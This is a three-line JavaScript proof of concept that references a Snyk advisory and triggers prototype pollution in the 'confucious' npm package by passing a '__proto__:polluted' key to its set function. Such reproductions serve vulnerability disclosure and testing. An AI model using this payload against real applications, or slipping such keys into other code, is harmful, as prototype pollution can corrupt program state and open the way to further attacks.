//https://snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665
const confucious = require("confucious");
confucious.set("__proto__:polluted", "yes");
